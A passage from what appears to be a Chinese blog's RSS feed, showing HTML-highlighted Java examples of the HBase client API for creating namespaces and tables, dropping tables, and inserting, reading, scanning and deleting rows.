NamespaceDescriptor<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>ns<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//4.2.2执行创建命名空间操作</span>        <span class="token keyword">try</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            admin<span class="token punctuation">.</span><span class="token function">createNamespace</span><span class="token punctuation">(</span>namespaceDescriptor<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NamespaceExistException</span> e<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"命名空间已存在！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//5.关闭连接</span>        admin<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        connection<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//6.返回结果</span>        <span class="token keyword">return</span> exists<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-2-创建表"><a href="#2-2-创建表" class="headerlink" title="2.2 创建表"></a>2.2 创建表</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>conf<span class="token punctuation">.</span>Configuration<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>hbase<span class="token punctuation">.</span>HBaseConfiguration<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>hbase<span class="token punctuation">.</span>NamespaceDescriptor<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>hbase<span class="token punctuation">.</span>NamespaceExistException<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>hbase<span class="token punctuation">.</span>TableName<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>hbase<span class="token punctuation">.</span>client<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>hbase<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Bytes<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HBase_DDL</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//TODO 创建表</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">createTable</span><span class="token punctuation">(</span>String tableName<span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> cfs<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//1.判断是否存在列族信息</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cfs<span class="token punctuation">.</span>length <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"请设置列族信息！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//2.判断表是否存在</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isTableExist</span><span class="token punctuation">(</span>tableName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"需要创建的表已存在！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//3.创建配置信息并配置</span>        Configuration configuration <span class="token operator">=</span> HBaseConfiguration<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        configuration<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"hbase.zookeeper.quorum"</span><span class="token punctuation">,</span> <span class="token string">"hadoop102,hadoop103,hadoop104"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//4.获取与HBase的连接</span>        Connection connection <span class="token operator">=</span> ConnectionFactory<span class="token punctuation">.</span><span class="token function">createConnection</span><span class="token punctuation">(</span>configuration<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//5.获取DDL操作对象</span>        Admin admin <span class="token operator">=</span> connection<span class="token punctuation">.</span><span class="token function">getAdmin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//6.创建表描述器构造器</span>        TableDescriptorBuilder tableDescriptorBuilder <span class="token operator">=</span> TableDescriptorBuilder<span class="token punctuation">.</span><span class="token function">newBuilder</span><span class="token punctuation">(</span>TableName<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>tableName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//7.循环添加列族信息</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>String cf <span class="token operator">:</span> cfs<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            ColumnFamilyDescriptorBuilder columnFamilyDescriptorBuilder <span class="token operator">=</span> ColumnFamilyDescriptorBuilder<span class="token punctuation">.</span><span class="token function">newBuilder</span><span class="token punctuation">(</span>Bytes<span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>cf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            tableDescriptorBuilder<span class="token punctuation">.</span><span class="token function">setColumnFamily</span><span class="token punctuation">(</span>columnFamilyDescriptorBuilder<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//8.执行创建表的操作</span>        admin<span class="token punctuation">.</span><span class="token function">createTable</span><span class="token punctuation">(</span>tableDescriptorBuilder<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//9.关闭资源</span>        admin<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        connection<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-3-删除表"><a href="#2-3-删除表" class="headerlink" title="2.3 删除表"></a>2.3 删除表</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>conf<span class="token punctuation">.</span>Configuration<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>hbase<span class="token punctuation">.</span>HBaseConfiguration<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>hbase<span class="token punctuation">.</span>NamespaceDescriptor<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>hbase<span class="token punctuation">.</span>NamespaceExistException<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>hbase<span class="token punctuation">.</span>TableName<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>hbase<span class="token punctuation">.</span>client<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>hbase<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Bytes<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HBase_DDL</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//TODO 删除表</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">dropTable</span><span class="token punctuation">(</span>String tableName<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//1.判断表是否存在</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isTableExist</span><span class="token punctuation">(</span>tableName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"需要删除的表不存在！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//2.创建配置信息并配置</span>        Configuration configuration <span class="token operator">=</span> HBaseConfiguration<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        configuration<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"hbase.zookeeper.quorum"</span><span class="token punctuation">,</span> <span class="token string">"hadoop102,hadoop103,hadoop104"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//3.获取与HBase的连接</span>        Connection connection <span class="token operator">=</span> ConnectionFactory<span class="token punctuation">.</span><span class="token function">createConnection</span><span class="token punctuation">(</span>configuration<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//4.获取DDL操作对象</span>        Admin admin <span class="token operator">=</span> connection<span class="token punctuation">.</span><span class="token function">getAdmin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//5.使表下线</span>        TableName name <span class="token operator">=</span> TableName<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>tableName<span class="token punctuation">)</span><span class="token punctuation">;</span>        admin<span class="token punctuation">.</span><span class="token function">disableTable</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//6.执行删除表操作</span>        admin<span class="token punctuation">.</span><span class="token function">deleteTable</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//7.关闭资源</span>        admin<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        connection<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-DML"><a href="#3-DML" class="headerlink" title="3 DML"></a>3 DML</h2><p>创建类HBase_DML</p><p>（1） 插入数据</p><p>（2） 单条数据查询</p><p>（3） 扫描数据</p><p>（4） 删除数据</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>conf<span class="token punctuation">.</span>Configuration<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>hbase<span class="token punctuation">.</span>Cell<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>hbase<span class="token punctuation">.</span>HBaseConfiguration<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>hbase<span class="token punctuation">.</span>TableName<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>hbase<span class="token punctuation">.</span>client<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>hbase<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Bytes<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HBase_DML</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//TODO 插入数据</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">putData</span><span class="token punctuation">(</span>String tableName<span class="token punctuation">,</span> String rowKey<span class="token punctuation">,</span> String cf<span class="token punctuation">,</span> String cn<span class="token punctuation">,</span> String value<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//1.获取配置信息并设置连接参数</span>        Configuration configuration <span class="token operator">=</span> HBaseConfiguration<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        configuration<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"hbase.zookeeper.quorum"</span><span class="token punctuation">,</span> <span class="token string">"hadoop102,hadoop103,hadoop104"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//2.获取连接</span>        Connection connection <span class="token operator">=</span> ConnectionFactory<span class="token punctuation">.</span><span class="token function">createConnection</span><span class="token punctuation">(</span>configuration<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//3.获取表的连接</span>        Table table <span class="token operator">=</span> connection<span class="token punctuation">.</span><span class="token function">getTable</span><span class="token punctuation">(</span>TableName<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>tableName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//4.1 插入数据</span>        <span class="token comment" spellcheck="true">//4.1.1 创建Put对象</span>        Put put <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Put</span><span class="token punctuation">(</span>Bytes<span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>rowKey<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//4.1.2 放入数据</span>        put<span class="token punctuation">.</span><span class="token function">addColumn</span><span class="token punctuation">(</span>Bytes<span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>cf<span class="token punctuation">)</span><span class="token punctuation">,</span> Bytes<span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>cn<span class="token punctuation">)</span><span class="token punctuation">,</span> Bytes<span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//4.1.3 执行插入数据操作</span>        table<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>put<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//4.2 单条数据查询</span>          <span class="token comment" spellcheck="true">//4.2.1 创建Get对象</span>        Get get <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Get</span><span class="token punctuation">(</span>Bytes<span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>rowKey<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 指定列族查询</span>        <span class="token comment" spellcheck="true">// get.addFamily(Bytes.toBytes(cf));</span>        <span class="token comment" spellcheck="true">// 指定列族:列查询</span>        <span class="token comment" spellcheck="true">// get.addColumn(Bytes.toBytes(cf), Bytes.toBytes(cn));</span>        <span class="token comment" spellcheck="true">//4.2.2查询数据</span>        Result result <span class="token operator">=</span> table<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>get<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//4.2.3解析result</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Cell cell <span class="token operator">:</span> result<span class="token punctuation">.</span><span class="token function">rawCells</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ROW:"</span> <span class="token operator">+</span> Bytes<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>CellUtil<span class="token punctuation">.</span><span class="token function">cloneRow</span><span class="token punctuation">(</span>cell<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span>                        <span class="token string">" CF:"</span> <span class="token operator">+</span> Bytes<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>CellUtil<span class="token punctuation">.</span><span class="token function">cloneFamily</span><span class="token punctuation">(</span>cell<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>                        <span class="token string">" CL:"</span> <span class="token operator">+</span> Bytes<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>CellUtil<span class="token punctuation">.</span><span class="token function">cloneQualifier</span><span class="token punctuation">(</span>cell<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>                        <span class="token string">" VALUE:"</span> <span class="token operator">+</span> Bytes<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>CellUtil<span class="token punctuation">.</span><span class="token function">cloneValue</span><span class="token punctuation">(</span>cell<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//4.3 scan数据</span>        <span class="token comment" spellcheck="true">//4.3.1创建Scan对象</span>        Scan scan <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scan</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//4.3.2扫描数据</span>        ResultScanner results <span class="token operator">=</span> table<span class="token punctuation">.</span><span class="token function">getScanner</span><span class="token punctuation">(</span>scan<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//4.3.3 解析results</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Result result <span class="token operator">:</span> results<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>Cell cell <span class="token operator">:</span> result<span class="token punctuation">.</span><span class="token function">rawCells</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>      System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>                       Bytes<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>CellUtil<span class="token punctuation">.</span><span class="token function">cloneRow</span><span class="token punctuation">(</span>cell<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">":"</span><span class="token operator">+</span> Bytes<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>CellUtil<span class="token punctuation">.</span><span class="token function">cloneFamily</span><span class="token punctuation">(</span>cell<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">":"</span> <span class="token operator">+</span>  Bytes<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>CellUtil<span class="token punctuation">.</span><span class="token function">cloneQualifier</span><span class="token punctuation">(</span>cell<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">":"</span> <span class="token operator">+</span>  Bytes<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>CellUtil<span class="token punctuation">.</span><span class="token function">cloneValue</span><span class="token punctuation">(</span>cell<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//4.4 删除数据</span>         <span class="token comment" spellcheck="true">//4.4.1创建Delete对象</span>        Delete delete <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Delete</span><span class="token punctuation">(</span>Bytes<span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>rowKey<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 指定列族删除数据</span>        <span class="token comment" spellcheck="true">// delete.addFamily(Bytes.toBytes(cf));</span>        <span class="token comment" spellcheck="true">// 指定列族:列删除数据(所有版本)</span>        <span class="token comment" spellcheck="true">// delete.addColumn(Bytes.toBytes(cf), Bytes.toBytes(cn));</span>        <span class="token comment" spellcheck="true">// 指定列族:列删除数据(指定版本)</span>        <span class="token comment" spellcheck="true">// delete.addColumns(Bytes.toBytes(cf), Bytes.toBytes(cn));</span>        <span class="token comment" spellcheck="true">//4.4.2执行删除数据操作</span>        table<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span>delete<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//5.关闭连接</span>        table<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        connection<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/HBase/">HBase</category>
      
      
      <comments>https://m01ly.github.io/2020/11/25/bigdata-HBase3-API/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>HBase学习笔记（一） 安装教程</title>
      <link>https://m01ly.github.io/2020/11/25/bigdata-HBase1-setup/</link>
      <guid>https://m01ly.github.io/2020/11/25/bigdata-HBase1-setup/</guid>
      <pubDate>Tue, 24 Nov 2020 22:46:51 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
